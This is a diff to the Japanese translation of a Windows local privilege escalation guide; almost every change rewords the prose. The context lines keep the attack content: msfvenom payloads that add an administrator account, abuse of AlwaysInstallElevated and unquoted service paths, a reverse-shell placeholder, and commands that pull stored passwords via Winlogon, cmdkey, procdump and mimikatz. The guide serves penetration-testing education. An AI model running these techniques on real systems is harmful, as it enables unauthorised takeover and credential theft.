@@ -2,13 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### **Windowsのローカル特権昇格ベクトルを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+### **Windowsのローカル特権昇格ベクターを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 ## 初期Windows理論
 
 ### アクセストークン
 
-**Windowsアクセストークンが何か知らない場合は、続行する前に以下のページを読んでください:**
+**Windowsアクセストークンが何か分からない場合は、続行する前に以下のページを読んでください:**
 
 {{#ref}}
 access-tokens.md
@@ -24,7 +24,7 @@ acls-dacls-sacls-aces.md
 
 ### 整合性レベル
 
-**Windowsの整合性レベルが何か知らない場合は、続行する前に以下のページを読んでください:**
+**Windowsの整合性レベルが何か分からない場合は、続行する前に以下のページを読んでください:**
 
 {{#ref}}
 integrity-levels.md
@@ -32,7 +32,7 @@ integrity-levels.md
 
 ## Windowsセキュリティコントロール
 
-Windowsには、**システムの列挙を妨げる**、実行可能ファイルを実行することを妨げる、または**あなたの活動を検出する**ことができるさまざまな要素があります。特権昇格の列挙を開始する前に、以下の**ページ**を**読み**、すべての**防御****メカニズム**を**列挙**する必要があります:
+Windowsには、**システムの列挙を妨げる**、実行可能ファイルを実行することや**あなたの活動を検出する**ことを**防ぐ**さまざまな要素があります。特権昇格の列挙を開始する前に、以下の**ページ**を**読み**、すべての**防御****メカニズム**を**列挙**するべきです:
 
 {{#ref}}
 ../authentication-credentials-uac-and-efs/
@@ -57,7 +57,7 @@ Get-Hotfix -description "Security update" #List only "Security Update" patches
 ```
 ### Version Exploits
 
-この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700以上のセキュリティ脆弱性があり、Windows環境が持つ**大規模な攻撃面**を示しています。
+この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700以上のセキュリティ脆弱性があり、Windows環境が提示する**大規模な攻撃面**を示しています。
 
 **システム上で**
 
@@ -97,7 +97,7 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 ### PowerShell トランスクリプトファイル
 
-この機能をオンにする方法は、[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で学ぶことができます。
+この機能をオンにする方法は[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で学ぶことができます。
 ```bash
 #Check is enable in the registry
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
@@ -112,9 +112,9 @@ Stop-Transcript
 ```
 ### PowerShell モジュール ロギング
 
-PowerShell パイプラインの実行の詳細が記録され、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、完全な実行の詳細と出力結果はキャプチャされない場合があります。
+PowerShell パイプラインの実行の詳細が記録され、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、完全な実行の詳細や出力結果はキャプチャされない場合があります。
 
-これを有効にするには、ドキュメントの「トランスクリプトファイル」セクションの指示に従い、**「モジュール ロギング」**を選択して**「PowerShell トランスクリプション」**の代わりに選択してください。
+これを有効にするには、ドキュメントの「トランスクリプトファイル」セクションの指示に従い、**"Module Logging"** を選択してください。**"Powershell Transcription"** の代わりに。
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
@@ -127,7 +127,7 @@ Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
 ```
 ### PowerShell **Script Block Logging**
 
-スクリプトの実行の完全なアクティビティと全内容の記録がキャプチャされ、実行されるコードの各ブロックが文書化されることが保証されます。このプロセスは、各アクティビティの包括的な監査証跡を保持し、フォレンジックや悪意のある行動の分析に役立ちます。実行時にすべてのアクティビティを文書化することにより、プロセスに関する詳細な洞察が提供されます。
+スクリプトの実行の完全なアクティビティと全コンテンツの記録がキャプチャされ、実行されるコードの各ブロックが文書化されることが保証されます。このプロセスは、各アクティビティの包括的な監査証跡を保持し、フォレンジックや悪意のある行動の分析に役立ちます。実行時にすべてのアクティビティを文書化することで、プロセスに関する詳細な洞察が提供されます。
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
@@ -152,7 +152,7 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 ```
 ## WSUS
 
-システムは、更新がhttpではなくhttp**S**を使用してリクエストされていない場合に危険にさらされる可能性があります。
+システムは、更新がhttpではなくhttp**S**を使用してリクエストされていない場合に危険にさらされます。
 
 次に、cmdで以下を実行して、ネットワークが非SSL WSUS更新を使用しているかどうかを確認します:
 ```
@@ -162,7 +162,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 ```
 Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
 ```
-もし次のような返信があった場合：
+これらのいずれかの返信を受け取った場合：
 ```bash
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
 WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
@@ -182,7 +182,7 @@ PSProvider   : Microsoft.PowerShell.Core\Registry
 
 この脆弱性を悪用するには、次のようなツールを使用できます: [Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) - これらは、非 SSL WSUS トラフィックに「偽」の更新を注入するための MiTM 武器化されたエクスプロイトスクリプトです。
 
-研究をこちらでお読みください:
+ここで研究を読む:
 
 {{#file}}
 CTX_WSUSpect_White_Paper (1).pdf
@@ -190,26 +190,26 @@ CTX_WSUSpect_White_Paper (1).pdf
 
 **WSUS CVE-2020-1013**
 
-[**完全なレポートをこちらでお読みください**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
+[**完全なレポートをこちらで読む**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
 基本的に、これはこのバグが悪用する欠陥です：
 
 > ローカルユーザープロキシを変更する権限があり、Windows Update が Internet Explorer の設定で構成されたプロキシを使用する場合、私たちは [PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自分のトラフィックを傍受し、資産上で昇格されたユーザーとしてコードを実行する権限を持つことになります。
 >
-> さらに、WSUS サービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名の自己署名証明書を生成し、この証明書を現在のユーザーの証明書ストアに追加すれば、HTTP および HTTPS WSUS トラフィックの両方を傍受できるようになります。WSUS は、証明書に対して信頼性のある初回使用型の検証を実装するための HSTS のようなメカニズムを使用していません。提示された証明書がユーザーによって信頼され、正しいホスト名を持っている場合、サービスによって受け入れられます。
+> さらに、WSUS サービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名の自己署名証明書を生成し、この証明書を現在のユーザーの証明書ストアに追加すれば、HTTP および HTTPS WSUS トラフィックの両方を傍受できるようになります。WSUS は、証明書に対して信頼性を初回使用時に検証する HSTS のようなメカニズムを使用していません。提示された証明書がユーザーによって信頼され、正しいホスト名を持っている場合、サービスによって受け入れられます。
 
 この脆弱性を利用するには、ツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使用できます（解放された場合）。
 
 ## KrbRelayUp
 
-**ローカル特権昇格**の脆弱性は、特定の条件下で Windows **ドメイン** 環境に存在します。これらの条件には、**LDAP 署名が強制されていない**環境、ユーザーが **リソースベースの制約付き委任 (RBCD)** を構成する権利を持っていること、およびユーザーがドメイン内でコンピュータを作成する能力が含まれます。これらの**要件**は、**デフォルト設定**を使用して満たされることに注意が必要です。
+**ローカル特権昇格**の脆弱性は、特定の条件下で Windows **ドメイン** 環境に存在します。これらの条件には、**LDAP 署名が強制されていない**環境、ユーザーが **リソースベースの制約付き委任 (RBCD)** を構成する権利を持っていること、およびユーザーがドメイン内でコンピュータを作成する能力が含まれます。これらの **要件** は **デフォルト設定** を使用して満たされることに注意が必要です。
 
-**エクスプロイトを見つけるには** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
+**エクスプロイトを見つける**には [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
 
-攻撃の流れについての詳細は、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を確認してください。
+攻撃の流れについての詳細は [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を確認してください。
 
 ## AlwaysInstallElevated
 
-**これらの 2 つのレジスタが** **有効** (値が **0x1**) の場合、あらゆる特権のユーザーが NT AUTHORITY\\**SYSTEM** として `*.msi` ファイルを **インストール** (実行) できます。
+**これらの 2 つのレジスタが **有効** (値が **0x1**) の場合、任意の特権を持つユーザーは `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **インストール** (実行) できます。
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -223,7 +223,7 @@ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.ms
 
 ### PowerUP
 
-`Write-UserAddMSI`コマンドをpower-upから使用して、現在のディレクトリ内にWindows MSIバイナリを作成し、特権を昇格させます。このスクリプトは、ユーザー/グループの追加を促すプリコンパイルされたMSIインストーラーを出力します（そのため、GIUアクセスが必要です）：
+`Write-UserAddMSI`コマンドをpower-upから使用して、現在のディレクトリ内にWindows MSIバイナリを作成し、特権を昇格させます。このスクリプトは、ユーザー/グループの追加を促すプリコンパイルされたMSIインストーラーを書き出します（そのため、GIUアクセスが必要です）：
 ```
 Write-UserAddMSI
 ```
@@ -264,7 +264,7 @@ create-msi-with-wix.md
 ```
 msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
 ```
-この脆弱性を悪用するには、次のものを使用できます: _exploit/windows/local/always_install_elevated_
+この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_
 
 ## アンチウイルスと検出器
 
@@ -282,7 +282,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 ```
 ### LAPS
 
-**LAPS**は、**ローカル管理者パスワードの管理**のために設計されており、ドメインに参加しているコンピュータ上で各パスワードが**一意で、ランダム化され、定期的に更新される**ことを保証します。これらのパスワードはActive Directory内に安全に保存され、ACLを通じて十分な権限が付与されたユーザーのみがアクセスでき、承認されている場合にローカル管理者パスワードを表示できます。
+**LAPS**は、**ローカル管理者パスワードの管理**のために設計されており、ドメインに参加しているコンピュータ上で各パスワードが**一意でランダム化され、定期的に更新される**ことを保証します。これらのパスワードはActive Directory内に安全に保存され、ACLを通じて十分な権限が付与されたユーザーのみがアクセスでき、認可されている場合にローカル管理者パスワードを表示できます。
 
 {{#ref}}
 ../active-directory-methodology/laps.md
@@ -290,36 +290,36 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 
 ### WDigest
 
-アクティブな場合、**平文のパスワードはLSASS**（ローカルセキュリティ認証サブシステムサービス）に保存されます。\
+アクティブな場合、**平文のパスワードはLSASS**（ローカルセキュリティ権限サブシステムサービス）に保存されます。\
 [**このページのWDigestに関する詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)。
 ```bash
 reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
 ```
 ### LSA保護
 
-**Windows 8.1**以降、Microsoftはローカルセキュリティ機関（LSA）の強化された保護を導入し、**信頼されていないプロセス**による**メモリの読み取り**やコードの注入を**ブロック**することで、システムのセキュリティをさらに強化しました。\
-[**LSA保護の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
+**Windows 8.1**から、Microsoftはローカルセキュリティ機関（LSA）の強化された保護を導入し、**信頼されていないプロセス**による**メモリの読み取り**やコードの注入を**ブロック**し、システムのセキュリティをさらに強化しました。\
+[**LSA保護に関する詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
 ```bash
 reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
 ```
 ### Credentials Guard
 
-**Credential Guard** は **Windows 10** で導入されました。その目的は、パス・ザ・ハッシュ攻撃のような脅威からデバイスに保存された資格情報を保護することです。| [**Credentials Guardに関する詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
+**Credential Guard** は **Windows 10** で導入されました。その目的は、デバイスに保存された資格情報をパス・ザ・ハッシュ攻撃のような脅威から保護することです。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
 ```bash
 reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
 ```
 ### キャッシュされた資格情報
 
-**ドメイン資格情報**は、**ローカルセキュリティ機関**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常、ユーザーのドメイン資格情報が確立されます。\
+**ドメイン資格情報**は、**ローカルセキュリティ機関**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常、ユーザーのためのドメイン資格情報が確立されます。\
 [**キャッシュされた資格情報の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
 ```bash
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
 ```
-## ユーザーとグループ
+## Users & Groups
 
-### ユーザーとグループの列挙
+### Enumerate Users & Groups
 
-自分が所属するグループに興味深い権限があるかどうかを確認する必要があります。
+あなたが所属するグループの中に、興味深い権限を持つものがあるか確認する必要があります。
 ```bash
 # CMD
 net users %username% #Me
@@ -344,8 +344,8 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 
 ### トークン操作
 
-このページで**トークンとは何か**について**もっと学んでください**：[**Windows トークン**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
-次のページをチェックして**興味深いトークンについて学び**、それらを悪用する方法を確認してください：
+このページで**トークンとは何か**について**詳しく学んでください**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
+次のページをチェックして、**興味深いトークンについて学び**、それらを悪用する方法を確認してください：
 
 {{#ref}}
 privilege-escalation-abusing-tokens.md
@@ -357,7 +357,7 @@ qwinsta
 klist sessions
 ```
 ### ホームフォルダ
-```powershell
+```bash
 dir C:\Users
 Get-ChildItem C:\Users
 ```
@@ -374,7 +374,7 @@ powershell -command "Get-Clipboard"
 ### ファイルとフォルダーの権限
 
 まず、プロセスをリストアップして、**プロセスのコマンドライン内にパスワードがないか確認します**。\
-**実行中のバイナリを上書きできるか**、またはバイナリフォルダーの書き込み権限があるかを確認して、可能な[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用します：
+実行中のバイナリを**上書きできるか**、またはバイナリフォルダーの書き込み権限があるかを確認して、可能な[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用します：
 ```bash
 Tasklist /SVC #List processes running and services
 tasklist /v /fi "username eq system" #Filter "system" processes
@@ -406,7 +406,7 @@ todos %username%" && echo.
 ```
 ### メモリパスワードマイニング
 
-**procdump**を使用して、実行中のプロセスのメモリダンプを作成できます。FTPのようなサービスは**メモリ内にクリアテキストで資格情報を持っています**。メモリをダンプして資格情報を読み取ってみてください。
+**procdump**を使用して、実行中のプロセスのメモリダンプを作成できます。FTPのようなサービスは**メモリ内に平文の資格情報を持っています**。メモリをダンプして資格情報を読み取ってみてください。
 ```bash
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
@@ -427,11 +427,11 @@ Get-Service
 ```
 ### パーミッション
 
-You can use **sc** to get information of a service
+**sc**を使用してサービスの情報を取得できます。
 ```bash
 sc qc <service_name>
 ```
-各サービスの必要な特権レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を持っていることをお勧めします。
+各サービスに必要な特権レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を持っていることをお勧めします。
 ```bash
 accesschk.exe -ucqv <Service_Name> #Check rights for different groups
 ```
@@ -448,7 +448,7 @@ accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 
 このエラーが発生している場合（例えばSSDPSRVの場合）：
 
-_システムエラー 1058 が発生しました。_\
+_システムエラー1058が発生しました。_\
 _サービスは無効になっているか、関連付けられた有効なデバイスがないため、開始できません。_
 
 次のようにして有効にできます。
@@ -487,7 +487,7 @@ net stop [service name] && net start [service name]
 
 ### サービスバイナリの弱い権限
 
-**サービスによって実行されるバイナリを変更できるかどうか**、または**バイナリが存在するフォルダーに対する書き込み権限があるかどうかを確認してください**（[**DLL Hijacking**](dll-hijacking/index.html)）**。**\
+**サービスによって実行されるバイナリを変更できるか、** または **バイナリが存在するフォルダに書き込み権限があるかを確認してください** ([**DLL Hijacking**](dll-hijacking/index.html))**。**\
 **wmic**（system32ではない）を使用してサービスによって実行されるすべてのバイナリを取得し、**icacls**を使用して権限を確認できます：
 ```bash
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
@@ -528,16 +528,16 @@ appenddata-addsubdirectory-permission-over-service-registry.md
 
 ### 引用されていないサービスパス
 
-実行可能ファイルへのパスが引用符内にない場合、Windows はスペースの前にあるすべての終了を実行しようとします。
+実行可能ファイルへのパスが引用符内にない場合、Windows はスペースの前のすべての終了を実行しようとします。
 
 例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次のように実行しようとします：
-```powershell
+```bash
 C:\Program.exe
 C:\Program Files\Some.exe
 C:\Program Files\Some Folder\Service.exe
 ```
 すべての引用されていないサービスパスをリストアップしますが、組み込みのWindowsサービスに属するものは除外します。
-```powershell
+```bash
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services
 
@@ -545,7 +545,7 @@ wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Window
 Get-ServiceUnquoted -Verbose
 ```
 
-```powershell
+```bash
 for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
 for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
 echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
@@ -553,7 +553,7 @@ echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s &&
 )
 ```
 
-```powershell
+```bash
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 **この脆弱性を検出し、悪用することができます** metasploitを使用して: `exploit/windows/local/trusted\_service\_path` metasploitを使用してサービスバイナリを手動で作成できます:
@@ -562,7 +562,7 @@ msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f ex
 ```
 ### Recovery Actions
 
-Windowsは、サービスが失敗した場合に実行されるアクションをユーザーが指定できるようにしています。この機能は、バイナリを指すように構成できます。このバイナリが置き換え可能であれば、特権昇格が可能かもしれません。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)で確認できます。
+Windowsは、サービスが失敗した場合に実行されるアクションを指定することをユーザーに許可します。この機能は、バイナリを指すように構成できます。このバイナリが置き換え可能であれば、特権昇格が可能かもしれません。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)にあります。
 
 ## Applications
 
@@ -615,7 +615,7 @@ privilege-escalation-with-autorun-binaries.md
 
 ### ドライバー
 
-可能な**サードパーティの奇妙/脆弱な**ドライバーを探してください。
+可能な**サードパーティの奇妙な/脆弱な**ドライバーを探してください。
 ```bash
 driverquery
 driverquery.exe /fo table
@@ -623,7 +623,7 @@ driverquery /SI
 ```
 ## PATH DLL Hijacking
 
-もし**PATHに存在するフォルダー内に書き込み権限がある場合**、プロセスによってロードされたDLLをハイジャックし、**権限を昇格させる**ことができるかもしれません。
+もし**PATHに存在するフォルダー内に書き込み権限がある**場合、プロセスによってロードされたDLLをハイジャックし、**権限を昇格**させることができるかもしれません。
 
 PATH内のすべてのフォルダーの権限を確認してください:
 ```bash
@@ -647,7 +647,7 @@ net share #Check current shares
 ```
 ### hosts file
 
-ホストファイルにハードコーディングされた他の既知のコンピュータを確認します。
+hostsファイルにハードコーディングされた他の既知のコンピュータを確認します。
 ```
 type C:\Windows\System32\drivers\etc\hosts
 ```
@@ -684,22 +684,22 @@ Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
 C:\Windows\System32\bash.exe
 C:\Windows\System32\wsl.exe
 ```
-バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つけることができます。
+バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも存在します。
 
-ルートユーザーを取得すると、任意のポートでリスニングできます（`nc.exe` を使用してポートでリスニングする最初の時に、GUIを通じて `nc` がファイアウォールによって許可されるべきかどうか尋ねられます）。
+ルートユーザーを取得すると、任意のポートでリスニングできます（`nc.exe` を使用してポートでリスニングする最初の時に、GUIを通じて `nc` がファイアウォールによって許可されるべきか尋ねられます）。
 ```bash
 wsl whoami
 ./ubuntun1604.exe config --default-user root
 wsl whoami
 wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
 ```
-bashをrootとして簡単に起動するには、`--default-user root`を試すことができます。
+bashをルートとして簡単に開始するには、`--default-user root`を試すことができます。
 
 `WSL`ファイルシステムは、フォルダー`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`で探索できます。
 
-## Windows Credentials
+## Windows資格情報
 
-### Winlogon Credentials
+### Winlogon資格情報
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
 
@@ -714,13 +714,13 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 ### Credentials manager / Windows vault
 
 From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
-Windows Vaultは、**Windows**が**ユーザーを自動的にログイン**させるためのサーバー、ウェブサイト、その他のプログラムのユーザー資格情報を保存します。一見すると、ユーザーがFacebookの資格情報、Twitterの資格情報、Gmailの資格情報などを保存し、ブラウザを通じて自動的にログインできるように見えるかもしれません。しかし、そうではありません。
+Windows Vaultは、**Windows**が**ユーザーを自動的にログインさせる**ことができるサーバー、ウェブサイト、その他のプログラムのユーザー資格情報を保存します。一見すると、ユーザーがFacebookの資格情報、Twitterの資格情報、Gmailの資格情報などを保存できるようになり、ブラウザを通じて自動的にログインできるように見えるかもしれません。しかし、そうではありません。
 
-Windows Vaultは、Windowsがユーザーを自動的にログインさせることができる資格情報を保存します。つまり、**リソース**（サーバーまたはウェブサイト）にアクセスするために資格情報が必要な**Windowsアプリケーションは、このCredential Manager** & Windows Vaultを利用し、ユーザーが常にユーザー名とパスワードを入力する代わりに提供された資格情報を使用できます。
+Windows Vaultは、Windowsがユーザーを自動的にログインさせることができる資格情報を保存します。つまり、リソース（サーバーまたはウェブサイト）にアクセスするために資格情報が必要な**Windowsアプリケーションは、このCredential Manager** & Windows Vaultを利用し、ユーザーが常にユーザー名とパスワードを入力する代わりに提供された資格情報を使用できます。
 
-アプリケーションがCredential Managerと相互作用しない限り、特定のリソースの資格情報を使用することは不可能だと思います。したがって、アプリケーションがボールトを利用したい場合は、何らかの方法で**資格情報マネージャーと通信し、そのリソースの資格情報をデフォルトのストレージボールトから要求する必要があります**。
+アプリケーションがCredential Managerと相互作用しない限り、特定のリソースの資格情報を使用することは不可能だと思います。したがって、アプリケーションがボールトを利用したい場合は、何らかの方法で**資格情報マネージャーと通信し、そのリソースの資格情報をデフォルトのストレージボールトから要求する**必要があります。
 
-`cmdkey`を使用して、マシン上に保存されている資格情報をリストします。
+`cmdkey`を使用して、マシン上に保存された資格情報のリストを表示します。
 ```bash
 cmdkey /list
 Currently stored credentials:
@@ -744,22 +744,22 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 
 **DPAPIは、ユーザーのログイン秘密から導出された対称鍵を通じて鍵の暗号化を可能にします**。システム暗号化が関与するシナリオでは、システムのドメイン認証秘密を利用します。
 
-DPAPIを使用して暗号化されたユーザーRSA鍵は、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存され、ここで`{SID}`はユーザーの[セキュリティ識別子](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**DPAPI鍵は、ユーザーの秘密鍵を同じファイル内で保護するマスター鍵と共に配置されており**、通常は64バイトのランダムデータで構成されています。（このディレクトリへのアクセスは制限されており、CMDの`dir`コマンドでその内容をリストすることはできませんが、PowerShellを通じてリストすることは可能です）。
-```powershell
+DPAPIを使用して暗号化されたユーザーRSA鍵は、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存され、ここで`{SID}`はユーザーの[セキュリティ識別子](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**DPAPIキーは、ユーザーの秘密鍵を同じファイル内で保護するマスターキーと共に配置されており**、通常は64バイトのランダムデータで構成されています。（このディレクトリへのアクセスは制限されており、CMDの`dir`コマンドを使用してその内容をリストすることはできませんが、PowerShellを通じてリストすることは可能です）。
+```bash
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
-**mimikatz モジュール** `dpapi::masterkey` を適切な引数（`/pvk` または `/rpc`）と共に使用して、それを復号化できます。
+**mimikatzモジュール** `dpapi::masterkey`を適切な引数（`/pvk`または`/rpc`）と共に使用して、それを復号化できます。
 
-**マスターパスワードによって保護された資格情報ファイル** は通常、次の場所にあります:
-```powershell
+**マスターパスワードによって保護された資格情報ファイル**は通常、次の場所にあります:
+```bash
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
 あなたは、適切な `/masterkey` を使用して **mimikatz module** `dpapi::cred` を使って復号化できます。\
-あなたは、`sekurlsa::dpapi` モジュールを使用して **メモリ** から **多くの DPAPI** **masterkeys** を **抽出** することができます（あなたが root の場合）。
+あなたは、`sekurlsa::dpapi` モジュールを使用して **メモリ** から多くの **DPAPI** **masterkeys** を **抽出** できます（あなたが root の場合）。
 
 {{#ref}}
 dpapi-extracting-passwords.md
@@ -767,10 +767,10 @@ dpapi-extracting-passwords.md
 
 ### PowerShell 認証情報
 
-**PowerShell 認証情報** は、暗号化された認証情報を便利に保存する方法として、**スクリプティング** と自動化タスクでよく使用されます。認証情報は **DPAPI** を使用して保護されており、通常、作成された同じコンピュータ上の同じユーザーによってのみ復号化できます。
+**PowerShell 認証情報** は、暗号化された認証情報を便利に保存する方法として、**スクリプト** および自動化タスクにしばしば使用されます。認証情報は **DPAPI** を使用して保護されており、通常、作成された同じコンピュータ上の同じユーザーによってのみ復号化できます。
 
 ファイルから PS 認証情報を **復号化** するには、次のようにします：
-```powershell
+```bash
 PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
 PS C:\> $credential.GetNetworkCredential().username
 
@@ -896,8 +896,8 @@ $ErrorActionPreference = $OrigError
 ```
 ### SCClient / SCCM
 
-`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
